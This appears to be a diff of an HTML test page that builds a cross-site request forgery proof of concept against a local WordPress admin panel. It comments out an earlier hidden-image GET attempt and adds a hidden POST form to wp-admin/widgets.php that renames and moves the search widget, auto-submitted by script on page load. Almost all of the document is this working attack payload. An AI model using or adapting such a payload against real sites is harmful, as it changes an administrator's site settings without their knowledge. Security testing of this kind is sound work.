@@ -13,6 +13,7 @@ Hello World
 </BODY>
 </HTML>
 -->
+<!--
 <HTML>
 <HEAD>
 <TITLE>PLS WORK!!!</TITLE>
@@ -20,6 +21,27 @@ Hello World
 <P>Work pls</P>
 <img src="http://127.0.0.1:8080/wp-admin/widgets.php?widgets-access=on&editwidget=search-2&sidebar=sidebar-2&key=0" width="0" height="0" border="0">
 Hello World
+</BODY>
+</HTML>
+-->
+<HTML>
+<HEAD>
+<TITLE>PLS WORK!!!</TITLE>
+</HEAD>
+<P>Work pls</P>
+<form name="csrf" action="http://127.0.0.1:8080/wp-admin/widgets.php" method="POST">
+    <input type="hidden" name="widget-search%5B2%5D%5Btitle%5D" value="csrfinsearch">
+    <input type="hidden" name="sidebar" value="sidebar-1">
+    <input type="hidden" name="sidebar-1_position" value="1">
+    <input type="hidden" name="savewidget" value="Save+Widget">
+    <input type="hidden" name="widget-id" value="search-2">
+    <input type="hidden" name="id_base" value="search">
+    <input type="hidden" name="multi_number" value="2">
+    <input type="hidden" name="_wp_http_referer" value="%2Fwp-admin%2Fwidgets.php%3Fwidgets-acess%3Don%26editwidget%3Dsearch-2%26sidebar%3Dsiderbar-1%26key%3D0">
+    <input type="submit">
+</form>
+Hello World
+<script>document.csrf.submit();</script>
 </BODY>
 </HTML>
 <!--
